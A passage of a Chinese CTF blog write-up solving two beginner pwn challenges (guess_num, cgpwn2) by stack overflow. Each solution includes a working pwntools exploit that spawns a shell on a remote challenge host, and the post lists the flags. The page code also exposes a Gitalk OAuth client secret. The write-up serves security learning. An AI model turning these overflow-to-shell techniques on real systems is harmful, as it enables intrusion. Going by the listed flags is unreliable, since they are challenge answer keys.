+<li><p><a href="https://blog.csdn.net/wangyezi19930928/article/details/16921927" target="_blank" rel="noopener">函数调用栈的讲解</a>这个博客写的挺好的。</p>
+</li>
+</ul>
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p><code>菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看一下文件信息，64位文件，开启了PIE，没有开启RELRO保护</p>
+<p><img src="https://ae01.alicdn.com/kf/H21c0a5f2fbb54210b4757c497db808c5H.jpg" alt></p>
+<p>之前没有介绍过这几个属性的含义，这里补上</p>
+<ul>
+<li><code>RELRO</code>: RELocation Read-Only, 重定向只读，可以防止GOT表被修改，这里没有开启这个保护，所以我们可以修改GOT表，来替换函数原本的功能。</li>
+<li><code>Stack</code>: 栈溢出检查，用<code>Canary</code>金丝雀值是否变化来检测,<code>Canary found</code>表示开启。</li>
+<li><code>NX</code>: No Execute，栈不可执行，windows上的DEP。</li>
+<li><code>PIE</code>: position-independent executables, 位置无关的可执行文件，也就是常说的<code>ASLR</code>(Address space layout randomization) 地址随机化， 程序每次启动基址都随机，所以一旦开启这个，就要想办法得到程序基址。</li>
+</ul>
+</li>
+<li><p>运行一下，猜数字？？？？</p>
+<p><img src="https://ae01.alicdn.com/kf/H69049b06618e48ce91f751a9360b1f6dD.jpg" alt></p>
+</li>
+<li><p>丢到ida里看看</p>
+<p><img src="https://ae01.alicdn.com/kf/Hcae44846fcb7469b82b55637eb42b454o.jpg" alt></p>
+<p>就是一直判断，不相等就退出程序，好像没有特殊的语句，但是循环结束后又运行了一个函数<code>sub_C3E</code>, 有点东西，查看函数</p>
+<p><img src="https://ae01.alicdn.com/kf/H3408191ec5204f7ca43af61c143af613d.jpg" alt></p>
+<p>是我们想要的了，接下来只要想办法让程序执行这个函数即可</p>
+</li>
+</ul>
+</li>
+<li><p>本来想要看看是不是和上一题一样，利用函数栈溢出来实现，但是后来发现，并没有函数栈溢出点，并且函数使用的是伪随机数，并且伪随机数的种子我们可以利用栈溢出<code>v8</code>来进行覆盖，那我们便可以直接获取到与程序相等的随机数，10次判断之后便可以获取到flag了。</p>
+<ul>
+<li><p>void srand(unsigned seed); //srand函数是随机数发生器的初始化函数</p>
+<p>int rand(void);                      //rand函数是用来产生伪随机数的</p>
+<p>seed的作用：srand函数根据参数seed，设置一个随机起点，而rand根据这个起点产生随机数序列。默认的seed为1，如果seed一样，则rand产生的随机数序列也一样。</p>
+</li>
+<li><p>查看偏移量</p>
+<p><img src="https://ae01.alicdn.com/kf/H38c50baaaf5944569f471dc142198922Q.jpg" alt></p>
+<p>v8就是var_30,   有惊喜，看到了seed， 那就没错了，溢出之后刚好覆盖seed[0],  可以看到偏移量位0x20。</p>
+</li>
+</ul>
+</li>
+<li><p>构建exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span> <span class="token number">30760</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+c <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#注意如果输出的方法是printf，那么如果源码中没有\n那就不要在exp中写成name:\n，否则会出现问题</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://ae01.alicdn.com/kf/Ha9d58f7628684603a69185a72494e515R.jpg" alt></p>
+</li>
+<li><p>答案：<code>cyberpeace{c5b84e1b00f05c2161748e7c9376c9cc}</code></p>
+</li>
+<li><p>总结：伪随机数的绕过，根本还是栈溢出</p>
+</li>
+</ul>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p><code>菜鸡认为自己需要一个字符串</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件信息，32位，PIE没开启，可执行栈。</p>
+<p><img src="https://ae01.alicdn.com/kf/H96c612402c1646a0b122398c137c067fF.jpg" alt></p>
+</li>
+<li><p>运行一下  </p>
+</li>
+</ul>
+<p><img src="https://ae01.alicdn.com/kf/Hcd12006561944279a577f0f11425d4ef4.jpg" alt></p>
+<ul>
+<li><p>丢带IDA里看看</p>
+<p><img src="https://ae01.alicdn.com/kf/Hf4c4f2d7a55b432986cfcad84d17c7ceC.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>main函数里面什么没有，看看hello(), 函数，发现新大陆</p>
+<p><img src="https://ae01.alicdn.com/kf/Hdb861e194f2248c3bc013543829cd1aaj.jpg" alt></p>
+<p>执行的语句几乎都在hello()函数里面，看了一下，gets函数又有溢出漏洞，下面需要寻找执行system的语句，找到了pwn()函数</p>
+<p><img src="https://ae01.alicdn.com/kf/H6ca467dd48114015a260ed864117d22eB.jpg" alt></p>
+<p>发现参数不是我们想要的”/bin/sh”, 接下来只要想办法将这个参数换成我们想要的就行了，搜索了一下程序中不存在我们想要的”/bin/sh“字符串，但是程序运行时我们输入了name变量的值，并且name是全局变量（bss起始），只要输入时将”/bin/sh“赋值给name， 再将name直接传给system()函数就行了。name的地址为<code>0x0804A080</code>。</p>
+<p><img src="https://ae01.alicdn.com/kf/H33167c3201e64185833602627a06bee9v.jpg" alt></p>
+</li>
+<li><p>计算溢出的偏移量</p>
+<p><img src="https://ae01.alicdn.com/kf/Hbfb1a7c5cb2141829fa8806a91ca4c6aX.jpg" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/H63433f30e5b043b29b771ad9640747f4D.jpg" alt></p>
+<p>偏移量：<code>0x26+0x4</code></p>
+</li>
+<li><p>写exp：<code>p32(0)</code> 为函数的返回地址，随便写个就行 如：”a”。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">35295</span><span class="token punctuation">)</span>
+
+e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"../mid_file/cgpwn2"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804A080</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here:\n"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行结果：</p>
+<p><img src="https://ae01.alicdn.com/kf/H587997d596b24a2c822b47171e9a8b5ej.jpg" alt></p>
+</li>
+<li><p>答案：<code>cyberpeace{1787e3b5ba74de671adcb64a147fb41f}</code></p>
+</li>
+<li><p>emmmm，这道题算自己写的吧，开始有点套路了，加油呀   []<del>(￣▽￣)</del>*。</p>
+</li>
+</ul>
+
+            </div>
+            <hr />
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">写作不易，客官能否打赏一杯奶茶？</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《攻防世界-pwn入门练习》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/14/2019-gong-fang-shi-jie-pwn-ru-men-lian-xi/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                子实
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '0ec96340c73d93f2ef96',
+        clientSecret: '5fc147935bb296ad377b62699db728084af6d56e',
+        repo: 'newlzs.github.io',
+        owner: 'newlzs',
+        admin: "newlzs",
+        id: '2019/09/14/2019-gong-fang-shi-jie-pwn-ru-men-lian-xi/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2019/09/14/2019-gong-fang-shi-jie-pwn-ru-men-lian-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="攻防世界-pwn入门练习">
+                        
+                        <span class="card-title">攻防世界-pwn入门练习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            逆向还是有点套路的，但是呢过程就比较复杂了，记住套路还要敢猜感想
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/竞赛/" target="_blank">
+                        <span class="chip bg-color">竞赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/09/06/2019-gong-fang-shi-jie-misc-ti-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="攻防世界：misc题解(新手)">
+                        
+                        <span class="card-title">攻防世界：misc题解(新手)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            大二了，决定正式开始学习网络安全，要坚持啊。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/竞赛/" target="_blank">
+                        <span class="chip bg-color">竞赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: ZS BLOG<br />'
+            + '作者: 子实<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; 2019 WeiYang. All Rights Reserved.
+
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+            <span class="white-color">31.5k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+            <span id="busuanzi_container_site_pv" style='display:none'>
+                <i class="fa fa-heart-o"></i>
+                本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv" style='display:none'>
+                人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+            </span>
+            
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/newlzs" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lzs.online@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://zhihu.com/people/li-da-da-da-73" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="https://user.qzone.qq.com/1581004928" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);
+        var pvcountOffset = 80000;
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2018, 12, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
